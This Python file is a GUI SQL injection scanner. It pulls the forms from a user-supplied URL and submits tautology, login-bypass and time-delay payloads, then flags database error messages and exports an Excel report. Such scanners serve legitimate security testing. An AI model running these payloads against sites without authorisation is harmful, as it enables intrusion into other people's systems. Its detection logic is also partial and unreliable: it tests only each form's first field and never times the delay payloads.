import requests
from bs4 import BeautifulSoup
import sys
from urllib.parse import urljoin
import tkinter as tk
from tkinter import scrolledtext, messagebox, filedialog
import threading
import logging
import datetime
import openpyxl
import matplotlib.pyplot as plt
import os

def sql_injection_scan_gui():
    log_filename = f"sql_scan_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    logging.basicConfig(filename=log_filename, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    def scan_url():
        url = url_entry.get().strip()
        result_text.delete(1.0, tk.END)
        result_text.insert(tk.END, f"[+] Scanning {url}...\n")
        logging.info(f"Starting scan for URL: {url}")

        def perform_scan():
            try:
                results = sql_injection_scan(url, result_text)
                if results and results["vulnerabilities"]:
                    generate_report(results, url)
            except Exception as e:
                result_text.master.after(0, lambda: result_text.insert(tk.END, f"[-] An error occurred: {e}\n")) #update in main thread
                logging.error(f"An error occurred during scan: {e}", exc_info=True)

        threading.Thread(target=perform_scan).start()

    def sql_injection_scan(url, result_text):
        s = requests.Session()
        s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"

        def get_forms(url):
            try:
                response = s.get(url, timeout=10)
                response.raise_for_status()
                soup = BeautifulSoup(response.content, "html.parser")
                return soup.find_all("form")
            except requests.RequestException as e:
                result_text.master.after(0, lambda: result_text.insert(tk.END, f"[-] Error fetching URL: {e}\n")) #update in main thread
                logging.error(f"Error fetching URL: {e}")
                return []

        def form_details(form):
            details = {}
            action = form.attrs.get("action", "")
            method = form.attrs.get("method", "get").lower()
            inputs = []

            for input_tag in form.find_all(["input", "textarea", "select"]):
                input_type = input_tag.attrs.get("type", "text")
                input_name = input_tag.attrs.get("name")
                input_value = input_tag.attrs.get("value", "")
                if input_name:
                    inputs.append({"type": input_type, "name": input_name, "value": input_value})

            details["action"] = action
            details["method"] = method
            details["inputs"] = inputs
            return details

        def vulnerable(response):
            errors = {
                "you have an error in your SQL syntax",
                "warning: mysql_fetch_array()",
                "unclosed quotation mark after the character string",
                "quoted string not properly terminated",
                "mysql_num_rows() expects",
                "error in your SQL query",
                "Microsoft OLE DB Provider for SQL Server",
                "syntax error in your sql syntax",
                "supplied argument is not a valid MySQL",
                "ORA-01756: quoted string not properly terminated",
                "PostgreSQL query failed",
                "SQLite3::SQLException",
            }

            try:
                response_text = response.content.decode().lower()
                return any(error in response_text for error in errors)
            except UnicodeDecodeError:
                return False

        forms = get_forms(url)
        result_text.master.after(0, lambda: result_text.insert(tk.END, f"[+] Detected {len(forms)} forms on {url}.\n"))#update in main thread
        logging.info(f"Detected {len(forms)} forms on {url}.")

        if not forms:
            result_text.master.after(0, lambda: result_text.insert(tk.END, "[-] No forms found. Exiting.\n")) #update in main thread
            logging.info("No forms found. Exiting.")
            return None

        payloads = [
            "'", "\"",
            "OR '1'='1' -- -", "OR \"1\"=\"1\" -- -",
            "' OR '1'='1' #", "\" OR \"1\"=\"1\" #",
            "') OR ('1'='1", "\") OR (\"1\"=\"1",
            "admin' -- -", "admin\" -- -",
            "'; waitfor delay '0:0:5'--", '"; waitfor delay "0:0:5"--',
            "' OR SLEEP(5) -- -", '" OR SLEEP(5) -- -',
            "1' or '1'='1", '1" or "1"="1',
            "';select pg_sleep(5);--", '";select pg_sleep(5);--',
            "1' or 1=1--", '1" or 1=1--',
            "1' or '1'='1'/*", '1" or "1"="1"/*',
            "1' or '1'='1';--", '1" or "1"="1";--',
        ]

        scan_results = {"vulnerabilities": []}

        for form in forms:
            details = form_details(form)

            if not details["inputs"]:
                result_text.master.after(0, lambda: result_text.insert(tk.END, "[-] Skipping form with no inputs.\n")) #update in main thread
                logging.info("Skipping form with no inputs.")
                continue

            action_url = urljoin(url, details["action"])

            input_tag = details["inputs"][0] if details["inputs"] else None

            if input_tag:
                for payload in payloads:
                    data = {input_tag["name"]: input_tag["value"] + payload}

                    result_text.master.after(0, lambda: result_text.insert(tk.END, f"[+] Testing {details['method'].upper()} form at {action_url} with payload {payload}\n")) #update in main thread
                    logging.info(f"Testing {details['method'].upper()} form at {action_url} with payload {payload}")

                    try:
                        if details["method"] == "post":
                            res = s.post(action_url, data=data, timeout=10)
                        else:
                            res = s.get(action_url, params=data, timeout=10)

                        if vulnerable(res):
                            result_text.master.after(0, lambda: result_text.insert(tk.END, f"[!!!] SQL Injection vulnerability detected at: {action_url} with payload {payload}\n")) #update in main thread
                            logging.critical(f"SQL Injection vulnerability detected at: {action_url} with payload {payload}")
                            scan_results["vulnerabilities"].append({
                                "url": action_url,
                                "payload": payload,
                                "form_details": details
                            })
                        else:
                            result_text.master.after(0, lambda: result_text.insert(tk.END, "[+] No SQL Injection vulnerability detected.\n")) #update in main thread
                            logging.info("No SQL Injection vulnerability detected.")

                    except requests.RequestException as e:
                        result_text.master.after(0, lambda: result_text.insert(tk.END, f"[-] Error sending request: {e}\n")) #update in main thread
                        logging.error(f"Error sending request: {e}")
                        continue
        return scan_results
    
    def generate_report(scan_results, original_url):
        filename = filedialog.asksaveasfilename(defaultextension=".xlsx", filetypes=[("Excel files", "*.xlsx")])
        if not filename:
            return

        wb = openpyxl.Workbook()
        ws = wb.active
        ws.append(["URL", "Payload", "Form Details"])
        for vuln in scan_results["vulnerabilities"]:
            ws.append([vuln["url"], vuln["payload"], str(vuln["form_details"])])

        url_counts = {}
        for vuln in scan_results["vulnerabilities"]:
            url = vuln["url"]
            url_counts[url] = url_counts.get(url, 0) + 1

        plt.bar(url_counts.keys(), url_counts.values())
        plt.xlabel("URLs")
        plt.ylabel("Vulnerability Count")
        plt.title(f"Vulnerabilities per URL ({original_url})")
        plt.savefig("vulnerability_chart.png")

        img = openpyxl.drawing.image.Image('vulnerability_chart.png')
        img.anchor = 'E2'
        ws.add_image(img)
        wb.save(filename)
        plt.close()
        os.remove("vulnerability_chart.png")

    window = tk.Tk()
    window.title("SQL Injection Scanner")

    url_label = tk.Label(window, text="Enter URL:")
    url_label.pack()

    url_entry = tk.Entry(window, width=50)
    url_entry.pack()

    scan_button = tk.Button(window, text="Scan", command=scan_url)
    scan_button.pack()

    result_text = scrolledtext.ScrolledText(window, width=80, height=20)
    result_text.pack()

    window.mainloop()

if __name__ == "__main__":
    sql_injection_scan_gui()